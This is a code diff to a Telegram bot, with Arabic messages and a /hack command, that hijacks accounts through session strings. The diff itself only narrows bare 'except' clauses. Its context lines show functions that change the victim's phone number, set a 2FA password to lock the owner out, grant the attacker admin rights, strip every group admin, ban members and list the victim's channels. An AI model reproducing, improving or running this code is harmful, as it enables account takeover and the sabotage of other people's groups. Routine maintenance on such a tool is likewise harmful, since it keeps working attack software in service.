@@ -33,7 +33,7 @@ async def change_number_code(strses, number, code, otp):
         phone_code=otp
       ))
       return True
-    except:
+    except Exception:
       return False
 
 async def change_number(strses, number):
@@ -71,7 +71,7 @@ async def promote(strses, grp, user):
     
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
-    except:
+    except Exception:
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
@@ -80,7 +80,7 @@ async def user2fa(strses):
     try:
       await X.edit_2fa('Mido')
       return True
-    except:
+    except Exception:
       return False
 
 async def demall(strses, grp):
@@ -89,7 +89,7 @@ async def demall(strses, grp):
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
         await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
-      except:
+      except Exception:
         await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
       
 
@@ -136,7 +136,7 @@ async def userbans(strses, grp):
     for x in k:
       try:
         await X.edit_permissions(grp, x.id, view_messages=False)
-      except:
+      except Exception:
         pass
     
 
@@ -149,7 +149,7 @@ async def userchannels(strses):
     for x in k.chats:
       try:
         i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
-      except:
+      except Exception:
         pass
     return str(i)
 
@@ -272,7 +272,7 @@ async def users(event):
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n /hack", buttons=keyboard)
       try:
         i = await userchannels(strses.text)
-      except:
+      except Exception:
         return await event.reply("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
@@ -442,7 +442,7 @@ async def users(event):
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
-      except:
+      except Exception:
         pass
       await event.reply("**- تم تنزيـل مشـرفيـن المجمـوعـة/القنـاة .. بنجـاح \n- شكـراً لـ استخدامـك ســورس Mido**", buttons=keyboard)
       
